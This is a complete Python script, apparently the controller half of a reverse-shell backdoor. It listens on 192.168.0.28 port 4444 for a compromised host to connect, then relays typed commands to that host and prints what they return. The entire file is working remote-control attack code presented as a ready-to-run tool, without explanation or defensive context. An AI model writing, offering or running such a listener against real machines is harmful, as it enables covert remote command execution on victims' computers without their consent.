#!/usr/bin/env python3
import socket
import json


import argparse


class Listener:
    def __init__(self, ip, port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((ip, port))
        print('[+] Waiting for connection.')
        self.server.listen(0)
        self.connection, address = self.server.accept()
        print('[+] Connected to {}!'.format(ip))

    def reliable_send(self, data):
        if type(data) is str:
            json_data = json.dumps(data)
        else:
            json_data = json.dumps(data.decode('utf-8'))
        self.connection.send(bytes(json_data, encoding='utf-8'))

    def reliable_receive(self):
        json_data = ''
        while True:
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except Exception as e:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()

    def run(self):
        while True:
            command = input('>> ')
            result = self.execute_remotely(command)
            if ':q' in result:
                break
            print(result)


if __name__ == '__main__':
    Listener('192.168.0.28', 4444).run()
